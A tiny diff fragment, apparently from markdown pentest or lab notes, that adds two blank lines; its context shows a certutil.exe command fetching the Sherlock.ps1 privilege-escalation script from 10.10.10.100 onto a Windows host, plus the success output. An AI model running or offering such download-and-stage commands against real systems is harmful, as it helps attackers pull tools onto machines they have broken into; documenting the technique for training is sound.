@@ -26,3 +26,5 @@ C:\>certutil.exe -urlcache -split -f "http://10.10.10.100/Sherlock.ps1" "C:\Wind
   4117
 CertUtil: -URLCache command completed successfully.
 ```
+
+
